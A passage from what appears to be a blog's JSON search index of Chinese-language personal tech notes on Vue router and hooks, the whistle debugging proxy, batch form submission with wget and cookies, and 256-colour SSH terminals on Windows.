true,</span><br><span class=\"line\">  childList: true,</span><br><span class=\"line\">  subtree: true,</span><br><span class=\"line\">  attributeOldValue: true,</span><br><span class=\"line\">  characterDataOldValue: true</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>雖然除了聊天室感覺很需要這個功能<br>但還想不到什麼情境可以用到….<br>要真的用其實直接用<a href=\"https://github.com/theomessin/vue-chat-scroll\" target=\"_blank\" rel=\"noopener\">theomessin/vue-chat-scroll: Automatic scroll-to-bottom directive for vue.</a><br>就可以了XD</p>\n","categories":["JavaScript"],"tags":["vue"]},{"title":"vueJS router 新手小試2","url":"/blog/2018/09/27/vueJS-router-%E6%96%B0%E6%89%8B%E5%B0%8F%E8%A9%A62/","content":"<p>補充上一篇東西<br>這次有加入了分頁功能</p>\n<a id=\"more\"></a>\n<a href=\"/blog/2018/09/27/vueJS-router-新手小試2/code.zip\" title=\"範例程式\">範例程式</a>\n<p>心得/開發問題</p>\n<ol>\n<li><p>transition-group mode沒有效果，transition-group有v-move移轉特效<br>網路上有找到用transition-delay來解決問題<br><a href=\"https://github.com/vuejs/vue/issues/3974\" target=\"_blank\" rel=\"noopener\">Allow mode for transition-group · Issue #3974 · vuejs/vue · GitHub</a></p>\n</li>\n<li><p>上一篇data binding雙向綁定問題，可以使用<code>:value</code>做綁定<br>但是發現radio會失效，雖然可以使用name方式解決，但是感覺不太滿意<br>最後想到用<code>JSON.parse(JSON.stringify(xxx))</code>解決<br><del>但放到<code>mounted</code>從<code>/edit/:id</code>進來吃不到this.data</del><br>最後想到用computed解決<br>(PS:好像是template出錯，有嘗試著用v-if閃過，但我覺得還是<code>computed</code>解比較漂亮)<br>2018/09/28 重新實作<a href=\"http://jsbin.com/siciwelobo/1/edit?html,js,output\" target=\"_blank\" rel=\"noopener\">JS Bin - Collaborative JavaScript Debugging</a><br>功能有正常出來</p>\n</li>\n</ol>\n<ol start=\"3\">\n<li>最後新增資料/修改資料，回去首頁的時候，資料還是舊的！我以為是拿出跟之前畫面一樣<br>但我發現我錯了，簡單做個小實驗<br>發現router 回去component物件都還會還原，但是<code>data</code>資料不會</li>\n</ol>\n<img src=\"/blog/2018/09/27/vueJS-router-新手小試2/1.gif\" title=\"title\">\n<p>但是…是vue-router問題，還是component也會這樣</p>\n<p>所以，還是實驗一下到底發生甚麼事情</p>\n<p><code>參考vue_c_test.html</code></p>\n<p>vuerouter跟一般component一樣<br>會重新產出</p>\n<p>但是我的回首頁狀態還在<br>到底發生甚麼事情<br><strong>後來突然想到會不會父組件傳data給子組件</strong><br>所以才會造成資料不會重新整理</p>\n<p><strong>router 踩雷小記</strong><br>router 載入compoent是分開的!!!這個好雷<br><a href=\"https://github.com/vuejs/vue-router/issues/77\" target=\"_blank\" rel=\"noopener\">Using a component name in a route definition · Issue #77 · vuejs/vue-router</a><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">var</span> router = <span class=\"keyword\">new</span> VueRouter(&#123;</span><br><span class=\"line\">        routes: [</span><br><span class=\"line\">  &#123; <span class=\"attr\">path</span>: <span class=\"string\">'/a'</span>, <span class=\"attr\">component</span>: Vue.component(<span class=\"string\">'a-component'</span>) &#125;,</span><br><span class=\"line\">  <span class=\"comment\">//router 載入compoent是分開的!!!這個好雷</span></span><br><span class=\"line\">  <span class=\"comment\">//[Using a component name in a route definition · Issue #77 · vuejs/vue-router](https://github.com/vuejs/vue-router/issues/77)</span></span><br><span class=\"line\">  &#123; <span class=\"attr\">path</span>: <span class=\"string\">'/b'</span>, <span class=\"attr\">component</span>: BComponent &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure></p>\n<ol start=\"4\">\n<li><code>res.headers.get(&quot;X-Total-Count&quot;);</code>得出來是數字，放到component可能要注意轉型，<code>parseInt(xxx)</code><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Vue warn]: Invalid prop: type check failed for prop &quot;records&quot;. Expected Number, got String.</span><br><span class=\"line\"></span><br><span class=\"line\">found in</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><a href=\"https://www.zhi-jie.net/vue2-study-vue-router-navigation-hook/\" target=\"_blank\" rel=\"noopener\">vue2学习篇一 vue-router 导航钩子 丨 智杰之家 - 关注互联网开发</a><br>router hook我還沒有玩到<br>看來我覺得還會有vueJS-router 新手小記3</p>\n","categories":["JavaScript"],"tags":["vue"]},{"title":"vueJS router 新手小試","url":"/blog/2018/09/26/vueJS-router-%E6%96%B0%E6%89%8B%E5%B0%8F%E8%A9%A6NOTE/","content":"<p>最近看了alex直播全家桶，也看了官網router範例<br>看官網範例可以<a href=\"https://github.com/vuejs/vue-router\" target=\"_blank\" rel=\"noopener\">vuejs/vue-router: 🚦 The official router for Vue.js.</a> git clone回去<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install </span><br><span class=\"line\">npm run dev</span><br></pre></td></tr></table></figure></p>\n<p>有看有懂，但實戰就忘了一堆XD<br>還是留一下比較<br><a id=\"more\"></a></p>\n<p>先小記我寫router問題/心得<br>有搭配json-server<br><code>json-server db.json --static .</code><br><a href=\"http://localhost:3000/index.htm\" target=\"_blank\" rel=\"noopener\">http://localhost:3000/index.htm</a><br>可以進入到網頁</p>\n<a href=\"/blog/2018/09/26/vueJS-router-新手小試NOTE/code.7z\" title=\"程式檔案\">程式檔案</a>\n<ol>\n<li><p>使用router 帶入param沒法帶vue本生data到component裡面<br>目前雖然用js閉包做到，但這樣不好看….，目前找不到方法，然到真的用vuex最佳解?</p>\n</li>\n<li><p>router  可以算是全域變數，一直看範例以為要<code>this.$router</code>才能用<br>(目前猜測 <code>new Vue</code>出來變數可能用<code>$xxx</code>可以抓到)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">new Vue(&#123;</span><br><span class=\"line\">    el,</span><br><span class=\"line\">    router,</span><br><span class=\"line\">    data</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>第一次嘗試ES6完整縮寫，看起來清爽多了<br><code>this.directorys.splice(this.directorys.findIndex( el =&gt; el.id == id), 1)</code></p>\n</li>\n<li><p>Router傳參數好像不太方便，但說不定有更好的方法(我還沒有嘗試用vuex)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">// &#123; path: &apos;/edit/:id&apos;, component: Edit_c, props: ()=&gt;&#123; return &#123; data : data.directorys.find( el =&gt;&#123;return el.id == 1 &#125;)&#125;  &#125;&#125;</span><br><span class=\"line\">    //帶router帶參數好像只能用props: true</span><br><span class=\"line\">    // &#123; path: &apos;/edit/:id&apos;, component: Edit_c, props: ()=&gt;&#123; return &#123; data : JSON.parse(JSON.stringify(data.directorys.find( el =&gt;&#123;return el.id == 1 &#125;)))&#125;  &#125;&#125;</span><br><span class=\"line\">    //router 帶 props 會連動 地雷，可用json parse stringify 來解決</span><br><span class=\"line\">    // 但好像不太能這樣用，一進/edit/xx 會出錯</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>ajax,fetch,axios 差別，目前查到的資料fetch是基於promise，axios是<code>XHR</code>加Promise，所以很多人都推axios<br>但我為什麼先用fetch呢?其實是懶得cdnjs找套件XD</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(&apos;/directorys&apos;,&#123;</span><br><span class=\"line\">    method: &apos;GET&apos;</span><br><span class=\"line\">&#125;).then((res)=&gt;&#123;</span><br><span class=\"line\">    if (!res.ok) throw new Error(res.statusText)</span><br><span class=\"line\">    return res.json();</span><br><span class=\"line\">&#125;).then((data)=&gt;&#123;</span><br><span class=\"line\">    this.directorys = data;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/Fetch_API/Using_Fetch\" target=\"_blank\" rel=\"noopener\">Using Fetch - Web APIs | MDN</a></p>\n<ul>\n<li><a href=\"https://juejin.im/post/5acde23c5188255cb32e7e76\" target=\"_blank\" rel=\"noopener\">从ajax到fetch、axios - 掘金</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000012836882\" target=\"_blank\" rel=\"noopener\">Jquery ajax, Axios, Fetch区别之我见 - 都选C - SegmentFault 思否</a></li>\n<li><a href=\"https://blog.csdn.net/twodogya/article/details/80223508\" target=\"_blank\" rel=\"noopener\">ajax、axios、fetch之间的详细区别以及优缺点 - CSDN博客</a></li>\n</ul>\n<ol start=\"6\">\n<li><p>Array.prototype.find ,Array.prototype.findIndex很實用</p>\n</li>\n<li><p>vuejs的table場景特效可以用<code>&lt;tbody&gt;</code><br><a href=\"https://github.com/vuejs/vue/issues/3907\" target=\"_blank\" rel=\"noopener\">transition-group is not working on tables · Issue #3907 · vuejs/vue</a></p>\n</li>\n<li><p>到底讓子元件做ajax查詢資料，還是讓父類別做ajax查詢，說真的感覺component做ajax比較好做，但是感覺寫在父層對component自由度會比較大<br>但相對<br>目前覺得很死component(只查某一類東西)在component做會比較好<br><del>不然data binding雙向綁定會搞死人，vue-router又不能使用v-once</del><br>我現在才想到我是不是因為用<code>v-model</code>關係<br>才導致雙向綁定，也許我該用<code>v-bind:value</code>才對  orz</p>\n</li>\n</ol>\n<ol start=\"9\">\n<li><p>input[type=radio]在使用vue data binding，用<code>JSON.parse(JSON.stringify(xxxx))</code>轉出物件做bind好像會有問題，後來有想到用computed做，但還沒測試。</p>\n</li>\n<li><p>router-view到底該不該寫event事件呢?我看很多範例都沒有這樣寫，不知道該寫event bus跟vuex哪個比較好，但是vuex還沒學，我想router搞熟在學會比較好</p>\n</li>\n</ol>\n<p>以上有些疑問可能要復仇名單(我有記得的話，再回來改)</p>\n<p>總結</p>\n<p>這次code寫的很糟糕，感覺有很多地方可以改進<br>也了解寫template沒有用<code>vue cli</code>真的很痛苦<br>就像寫筆記本沒亮度提示，真的很傷眼睛XD</p>\n<p>router 串大量參數感覺真的很不方便，難道真的要靠vuex解決?<br>有空研究一下還有什麼方法，閉包解法真的不是很好看</p>\n<p>感覺<code>&lt;component is=&quot;xxx&quot;&gt;</code>和vue-router比起來<br>可以做到<code>頁籤分頁</code>功能，我想唯一的是vue-router有做到回上一頁功能<br>說真的這個真的很方便</p>\n<p>但網頁上寫commponent真的很痛苦<br>難道該跳cli了XD</p>\n<p>最後突然想到component有一個keep-alive<br>就在想router有沒有這玩意<br><a href=\"https://www.jianshu.com/p/0b0222954483\" target=\"_blank\" rel=\"noopener\">vue-router 之 keep-alive - 简书</a></p>\n<p>最後又想到event問題，官方文件沒有提到<br>但我實作一下，好像可以用</p>\n","categories":["Javascript"],"tags":["vue"]},{"title":"vuejs hook和router hook小記","url":"/blog/2018/09/30/vuejs-hook%E5%92%8Crouter-hook%E5%B0%8F%E8%A8%98/","content":"<p>vuejs hook和router hook小記</p>\n<a id=\"more\"></a>\n<a href=\"/blog/2018/09/30/vuejs-hook和router-hook小記/vue_c_test_hook.zip\" title=\"檔案\">檔案</a>\n<p>心得/紀錄:</p>\n<p>Vue hook</p>\n<ol>\n<li><p>beforeCreate不會抓到this屬性(props,data)，原因還沒被做出來</p>\n</li>\n<li><p>component剛建立出來，不會觸發到beforeUpdate,updated，只有template被更新的時候會觸發，但是!!!改data…等等沒觸發到template也不會有問題</p>\n</li>\n</ol>\n<p>Vue Router hook</p>\n<ol>\n<li><p>進行第2次寫入，不會有效果，一樣保持第一次beforeEach hook東西，也許這跟event沒有關係，</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"comment\">//測試router hook</span></span><br><span class=\"line\">    router.beforeEach(<span class=\"function\">(<span class=\"params\">to,<span class=\"keyword\">from</span>,next</span>)=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'1'</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 進行第<span class=\"number\">2</span>次寫入，不會有效果，一樣保持第一次beforeEach hook東西</span><br><span class=\"line\">也沒有看到文件說明 --&gt;</span><br><span class=\"line\">router.beforeEach(<span class=\"function\">(<span class=\"params\">to,<span class=\"keyword\">from</span>,next</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'2'</span>);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(to);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">from</span>);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(next);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Vue scrollBehavior 滚动行为，詳細看範例，這篇不好讀<br><a href=\"https://www.cnblogs.com/sophie_wang/p/7880261.html\" target=\"_blank\" rel=\"noopener\">Vue scrollBehavior 滚动行为 - 悦涵 - 博客园</a></p>\n</li>\n<li><p><del>全域router hook的<code>this</code>，應該是指router變數</del>結果…我console.log出來是<code>underfined</code></p>\n</li>\n</ol>\n<p>子組件 hook</p>\n<ol>\n<li><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">beforeRouteEnter (to, <span class=\"keyword\">from</span>, next) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 在渲染該組件的對應路由被 confirm 前調用</span></span><br><span class=\"line\">  <span class=\"comment\">// 不！能！獲取組件實例 `this`</span></span><br><span class=\"line\">  <span class=\"comment\">// 因為當守衛執行前，組件實例還沒被創建</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">beforeRouteUpdate (to, <span class=\"keyword\">from</span>, next) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 在當前路由改變，但是該組件被覆用時調用</span></span><br><span class=\"line\">  <span class=\"comment\">// 舉例來說，對於一個帶有動態參數的路徑 /foo/:id，在 /foo/1 和 /foo/2 之間跳轉的時候，</span></span><br><span class=\"line\">  <span class=\"comment\">// 由於會渲染同樣的 Foo 組件，因此組件實例會被覆用。而這個鉤子就會在這個情況下被調用。</span></span><br><span class=\"line\">  <span class=\"comment\">// 可以訪問組件實例 `this`</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">beforeRouteLeave (to, <span class=\"keyword\">from</span>, next) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 導航離開該組件的對應路由時調用</span></span><br><span class=\"line\">  <span class=\"comment\">// 可以訪問組件實例 `this`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>meta 這方面就看官網範例，可以看一下範例註解</p>\n<p>順便一提，css有一個<a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/scroll-behavior\" target=\"_blank\" rel=\"noopener\">scroll-behavior - CSS: Cascading Style Sheets | MDN</a><br>但是跟vue沒關係</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/26724001\" target=\"_blank\" rel=\"noopener\">理解 $nextTick 的作用</a>還沒有研究，剩下就是vuex</p>\n<p>參考來源:<br><a href=\"https://segmentfault.com/q/1010000008973485\" target=\"_blank\" rel=\"noopener\">javascript - vue-router钩子beforeRouteEnter函数获取到this实例 - SegmentFault 思否</a><br><a href=\"https://router.vuejs.org/zh/guide/advanced/meta.html\" target=\"_blank\" rel=\"noopener\">路由元信息 | Vue Router</a><br><a href=\"https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E5%AE%8C%E6%95%B4%E7%9A%84%E5%AF%BC%E8%88%AA%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B\" target=\"_blank\" rel=\"noopener\">导航守卫 | Vue Router</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/scroll-behavior\" target=\"_blank\" rel=\"noopener\">scroll-behavior - CSS: Cascading Style Sheets | MDN</a><br><a href=\"https://www.cnblogs.com/sophie_wang/p/7880261.html\" target=\"_blank\" rel=\"noopener\">Vue scrollBehavior 滚动行为 - 悦涵 - 博客园</a><br><a href=\"https://zhuanlan.zhihu.com/p/26724001\" target=\"_blank\" rel=\"noopener\">理解 $nextTick 的作用</a><br><a href=\"https://www.zhi-jie.net/vue2-study-vue-router-navigation-hook/\" target=\"_blank\" rel=\"noopener\">vue2学习篇一 vue-router 导航钩子 丨 智杰之家 - 关注互联网开发</a></p>\n","categories":["JavaScript"],"tags":["vue"]},{"title":"whistle - 在Linux下類似Fiddler抓封包工具","url":"/blog/2018/10/13/whistle-%E5%9C%A8Linux%E4%B8%8B%E9%A1%9E%E4%BC%BCFiddler%E6%8A%93%E5%B0%81%E5%8C%85%E5%B7%A5%E5%85%B7/","content":"<p>最近工司需要測試APP API<br>明天要帶我的Linux筆電到公司<br>沒有類似Fiddler工具<br>今天爬到一個好用的工具<br>簡單筆記一下</p>\n<a id=\"more\"></a>\n<p>首先有找到在Linux 下開啟<a href=\"https://www.cnblogs.com/jcli/p/4474332.html\" target=\"_blank\" rel=\"noopener\">Linux(Ubuntu)环境下使用Fiddler - 海鸟 - 博客园</a><br>但是我不通時裝其他的東西</p>\n<p><a href=\"https://segmentfault.com/q/1010000000094520\" target=\"_blank\" rel=\"noopener\">httproxy - Fiddler 在 linux/OSx 下的替代品? - SegmentFault 思否</a></p>\n<p>裡面提到這些</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/jcli/p/4474332.html\" target=\"_blank\" rel=\"noopener\">Linux(Ubuntu)环境下使用Fiddler - 海鸟 - 博客园</a></li>\n<li><a href=\"https://segmentfault.com/q/1010000000094520\" target=\"_blank\" rel=\"noopener\">httproxy - Fiddler 在 linux/OSx 下的替代品? - SegmentFault 思否</a></li>\n<li><a href=\"https://github.com/deemstone/dproxy\" target=\"_blank\" rel=\"noopener\">deemstone/Dproxy: Web调试代理,类似Fiddler的工具. 完全Nodejs编写,跨平台. A smarty proxy tool for web debugging, it’s works like Fiddler.</a></li>\n<li><a href=\"https://www.charlesproxy.com/\" target=\"_blank\" rel=\"noopener\">Charles Web Debugging Proxy • HTTP Monitor / HTTP Proxy / HTTPS &amp; SSL Proxy / Reverse Proxy</a></li>\n<li><a href=\"https://www.wireshark.org/download.html\" target=\"_blank\" rel=\"noopener\">Wireshark · Download</a></li>\n<li><a href=\"https://alternativeto.net/software/fiddler/?platform=linux\" target=\"_blank\" rel=\"noopener\">Fiddler Alternatives for Linux - AlternativeTo.net</a></li>\n<li><a href=\"https://github.com/goddyZhao/nproxy\" target=\"_blank\" rel=\"noopener\">goddyZhao/nproxy: A cli proxy tool specialized in file replacing</a></li>\n<li><a href=\"https://github.com/avwo/whistle\" target=\"_blank\" rel=\"noopener\">avwo/whistle: HTTP, HTTPS, WebSocket debugging proxy</a></li>\n<li><a href=\"https://github.com/AlloyTeam/Rythem\" target=\"_blank\" rel=\"noopener\">AlloyTeam/Rythem: a fiddler-like project using Qt</a></li>\n<li><a href=\"http://www.alloyteam.com/2012/05/web-front-end-tool-rythem-1/\" target=\"_blank\" rel=\"noopener\">【AlloyTeam Web前端工具系列2】开源跨平台的Web抓包分析工具 Rythem (2012-09-19更新) | AlloyTeam</a></li>\n</ul>\n<p>最後我選擇，<a href=\"https://github.com/avwo/whistle\" target=\"_blank\" rel=\"noopener\">avwo/whistle: HTTP, HTTPS, WebSocket debugging proxy</a><br>我Linux有裝nodejs，所以安裝設定有中文文件<a href=\"http://wproxy.org/whistle/\" target=\"_blank\" rel=\"noopener\">关于whistle · GitBook</a></p>\n<p>安裝方法<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g whistle</span><br></pre></td></tr></table></figure></p>\n<p>啟動<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">w2 start</span><br></pre></td></tr></table></figure></p>\n<p>結束<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">w2 stop</span><br></pre></td></tr></table></figure></p>\n<p>就這麼簡單!!!!</p>\n<img src=\"/blog/2018/10/13/whistle-在Linux下類似Fiddler抓封包工具/1.png\" title=\"whistle\">\n<p>在接下來設定Android Wifi Proxy就完成了</p>\n<p>查看封包也是看Web介面xxx.xxx.xxx.xxx:8899</p>\n<p>但是設定proxy也是同一個port<br>這是什麼巫術XDD</p>\n<p><strong>2021-05-02</strong></p>\n<p><a href=\"https://github.com/youzan/zan-proxy\" target=\"_blank\" rel=\"noopener\">GitHub - youzan/zan-proxy: An extensible proxy for PC/Mobile/APP developer</a><br><a href=\"https://github.com/alibaba/anyproxy\" target=\"_blank\" rel=\"noopener\">GitHub - alibaba/anyproxy: A fully configurable http/https proxy in NodeJS</a></p>\n","categories":["實用工具"],"tags":["whistle"]},{"title":"wget 做 POST 表單發送","url":"/blog/2019/12/29/wget-%E5%81%9A-POST-%E8%A1%A8%E5%96%AE%E7%99%BC%E9%80%81/","content":"<p>最近收到一個工單<br>是有關於做大量資料做修改<br>目前有一隻程式做單一資料置換<br>要怎麼快速對大量資料直接用現有程式做呢?<br>那就多批發送表單吧</p>\n<a id=\"more\"></a>\n<p>Google 到 <a href=\"https://blog.csdn.net/cws1214/article/details/21440691\" target=\"_blank\" rel=\"noopener\">使用curl和wget发送post请求_cws1214的专栏-CSDN博客</a> 可以簡單用 wget 使用<br>為什麼使用 wget 做呢? 這樣就可以留下 log 紀錄檔<br>相同的url 後面可以加?<strong>idnum</strong><br>EX:<code>wget --post-data=&quot;user=user1&amp;pass=pass1&amp;submit=Login&quot;  http://domain.com/path/page_need_login.php?12345</code></p>\n<p>接下來目錄下會有<code>page_need_login.php?12345</code><br>這就可以當 log 資訊</p>\n<p>快速解決!!</p>\n<p><strong>2020-02-04</strong></p>\n<p>今天接到一個需求，使用系統要大量資料做功能處理<br>但由於太多，頁面處理也需要很久的時間<br>於是這件工作變成 IT 工作需求</p>\n<p>首先，這頁處理功能有確認帳號密碼<br>要先排除這個，需要找 wget 可以做 cookies 傳遞</p>\n<p><a href=\"https://xyz.cinc.biz/2014/10/linux-curl-wget-cookie.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: Linux 使用 curl (wget) 自動訪問網頁</a><br><a href=\"https://addons.mozilla.org/zh-TW/firefox/addon/export-cookies-txt/\" target=\"_blank\" rel=\"noopener\">Export Cookies – 下載 🦊 Firefox 擴充套件（zh-TW）</a></p>\n<p>抓取 cookies 方法<br><a href=\"https://www.opencli.com/linux/wget-enable-cookie-download\" target=\"_blank\" rel=\"noopener\">wget 開啟 cookie</a><br><a href=\"https://echochio.pixnet.net/blog/post/32574231-wget%E5%8F%96cookies-%E7%94%A8-cookies\" target=\"_blank\" rel=\"noopener\">wget取cookies 用 cookies @ echochio :: 痞客邦 ::</a></p>\n<p>使用<code>wget -d --load-cookies=cookies &quot;https://dc2.safesync.com/test.ova?dl=1&quot;</code><br>參考<a href=\"https://ephrain.net/mac-%E4%BD%BF%E7%94%A8-wget-%E9%80%81%E5%87%BA-cookie%EF%BC%8C%E7%99%BB%E5%85%A5%E7%B6%B2%E7%AB%99%E5%BE%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">[Mac] 使用 wget 送出 cookie，登入網站後下載檔案 | EPH 的程式日記</a><br>可以 debug 出東西</p>\n<p>但是我想直接用瀏覽器 Cookies 出來<br>一直在想 Cookies 要怎麼組<br><a href=\"https://addons.mozilla.org/zh-TW/firefox/addon/export-cookies-txt/\" target=\"_blank\" rel=\"noopener\">Export Cookies – 下載 🦊 Firefox 擴充套件（zh-TW）</a><br>這個很快就解決問題</p>\n<p><del>其實上述網頁就有寫格式，我當初沒注意到</del><br>有工具產生比較快</p>\n<p>cookies 格式<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">dc2.safesync.com TRUE / FALSE 0 fmprm si</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://xyz.cinc.biz/2014/10/linux-curl-wget-cookie.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: Linux 使用 curl (wget) 自動訪問網頁</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">取cookies</span><br><span class=\"line\">wget --cookies=on --keep-session-cookies --save-cookies=cookie.txt &quot;http://server.com/&quot; -O 123.html</span><br><span class=\"line\"></span><br><span class=\"line\">用cookies</span><br><span class=\"line\">wget --referer=&quot;http://server.com/&quot; --cookies=on --load-cookies=cookie.txt --keep-session-cookies --save-cookies=cookie.txt &quot;http://server.com/menu&quot; -O 456.html</span><br><span class=\"line\"></span><br><span class=\"line\">取cookies 加 user &amp; pass</span><br><span class=\"line\">wget --cookies=on --save-cookies=cookies.txt --post-data &apos;user=chio&amp;password=chio&apos; &quot;http://server.com/auth.php&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">用cookies</span><br><span class=\"line\">wget --cookies=on --load-cookies=cookies.txt -m -E -k &quot;http://server.com/interesting/article.php&quot;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://echochio.pixnet.net/blog/post/32574231-wget%E5%8F%96cookies-%E7%94%A8-cookies\" target=\"_blank\" rel=\"noopener\">wget取cookies 用 cookies @ echochio :: 痞客邦 ::</a></p>\n<p>相信透過這些很簡單可以寫個自動化工具!!</p>\n<h2 id=\"timeout-try-次數\"><a href=\"#timeout-try-次數\" class=\"headerlink\" title=\"timeout try 次數\"></a>timeout try 次數</h2><p><a href=\"https://stackoverflow.com/questions/2291524/does-wget-timeout\" target=\"_blank\" rel=\"noopener\">linux - Does WGET timeout? - Stack Overflow</a></p>\n<p>預設 900 秒  嘗試次數 5 次</p>\n","categories":["Linux"],"tags":["linux"]},{"title":"window做ssh有辦法做到256顏色方法","url":"/blog/2019/01/07/window%E5%81%9Assh%E6%9C%89%E8%BE%A6%E6%B3%95%E5%81%9A%E5%88%B0256%E9%A1%8F%E8%89%B2%E6%96%B9%E6%B3%95/","content":"<p>最近打算把筆電 elementary os 帶去公司開發<br>主要想把 docker 環境帶過去<br>但是我電腦設定 zsh<br>原本想共用電腦切換<br>但卡在滑鼠鍵盤不能共用<br>所以有找一些方法</p>\n<ul>\n<li>USB 切換器 OR KVM (價格也不便宜)</li>\n<li>USB 拷貝線(價格不便宜，但只能用在 Window 上面…)</li>\n<li><a href=\"https://www.jianshu.com/p/9fd09bb9f694\" target=\"_blank\" rel=\"noopener\">键盘鼠标共享效率工具-Synergy - 简书</a></li>\n</ul>\n<p>原本最後想用 Synergy<br>但是我又不想使用…網路<br>最後看到有人說 Linux 還需要遠端嗎? ssh 就好 XDD<br>我覺得好像有道理<br>但是一般 pietty 進去 zsh 沒有 256 顏色真的醜到爆…<br>所以找了一些方法</p>\n<a id=\"more\"></a>\n<p>網路一堆教 putty 方法，但我測試都不能用…<br>所以決定放棄</p>\n<p><a href=\"https://github.com/zeit/hyper/issues/1968\" target=\"_blank\" rel=\"noopener\">Help with 256 color support on Windows · Issue #1968 · zeit/hyper</a><br>原本看到這篇有安裝 hyper<br>但沒成功支援 256 色<br><del>工程師壓力大…看 cmd 黑白會 coding 越會黑白，舒適好看 command 才看得爽</del><br>但下面有人提到<a href=\"https://eugeny.github.io/terminus/\" target=\"_blank\" rel=\"noopener\">Terminus</a><br>立馬下載免安裝<br><a href=\"https://github.com/Eugeny/terminus/releases/tag/v1.0.68\" target=\"_blank\" rel=\"noopener\">Release Alpha 68 · Eugeny/terminus</a><br>設定字型<code>hack</code><br>windows 可正常跑出顏色!!!<br>雖然有些還不是很完美(下面不知道為什麼會多一行)<br>但至少顏色都出來</p>\n<img src=\"/blog/2019/01/07/window做ssh有辦法做到256顏色方法/1.jpg\">\n<p>其他參考來源:</p>\n<ul>\n<li><a href=\"http://www.lulian.cn/news/277-cn.html\" target=\"_blank\" rel=\"noopener\">USB 对拷线设置教程</a></li>\n<li><a href=\"https://www.jianshu.com/p/c3b162df3b57\" target=\"_blank\" rel=\"noopener\">win10 下的 VSCode 用 cmder 作默认的命令终端(shell) - 简书</a></li>\n<li><a href=\"https://ppundsh.github.io/posts/ad6e/\" target=\"_blank\" rel=\"noopener\">PowerShell 美化：oh my posh | Flymia 凡事用心之事</a></li>\n<li><a href=\"https://blog.mordsgau.de/oh-my-zsh-with-putty/\" target=\"_blank\" rel=\"noopener\">Oh My ZSH! with PuTTY » mordsgau.de Blog</a></li>\n<li><a href=\"https://www.reddit.com/r/elementaryos/comments/62ifss/how_do_you_do_remote_access/\" target=\"_blank\" rel=\"noopener\">How do you do remote access? : elementaryos</a></li>\n<li><a href=\"http://gaomf.cn/2017/01/16/Terminal_Color/\" target=\"_blank\" rel=\"noopener\">判断终端色彩支持情况的方法 | 高明飞的博客</a></li>\n<li><a href=\"https://www.jianshu.com/p/9fd09bb9f694\" target=\"_blank\" rel=\"noopener\">键盘鼠标共享效率工具-Synergy - 简书</a></li>\n<li><a href=\"https://chocolatey.org/packages/synergy\" target=\"_blank\" rel=\"noopener\">Chocolatey Gallery | synergy (Install) 1.7.5</a></li>\n</ul>\n","categories":["實用工具"],"tags":["ssh"]},{"title":"window桌面新增檔案/資料夾，畫面不會即時更動","url":"/blog/2018/08/22/window%E6%A1%8C%E9%9D%A2%E6%96%B0%E5%A2%9E%E6%AA%94%E6%A1%88-%E8%B3%87%E6%96%99%E5%A4%BE%EF%BC%8C%E7%95%AB%E9%9D%A2%E4%B8%8D%E6%9C%83%E5%8D%B3%E6%99%82%E6%9B%B4%E5%8B%95/","content":"<p>公司電腦桌面新增檔案，畫面不會即時…<br>網路找都找不到是什麼問題?<br>最後找到這一篇<a href=\"https://www.mobile01.com/topicdetail.php?f=512&amp;t=1931352&amp;p=1#31381395\" 